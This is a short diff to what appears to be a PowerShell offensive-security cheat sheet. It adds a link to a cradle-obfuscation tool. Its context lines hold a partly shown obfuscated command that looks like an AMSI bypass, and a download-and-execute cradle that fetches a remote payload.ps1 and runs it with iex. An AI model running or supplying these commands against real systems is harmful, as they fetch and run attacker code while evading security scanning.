@@ -86,6 +86,7 @@ Invoke-Command -Scriptblock {S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + (
 ```
 
 #### Download and execute cradle
+- Usefull tool: https://github.com/danielbohannon/Invoke-CradleCrafter
 ```
 iex (New-Object Net.WebClient).DownloadString('https://xx.xx.xx.xx/payload.ps1')
 
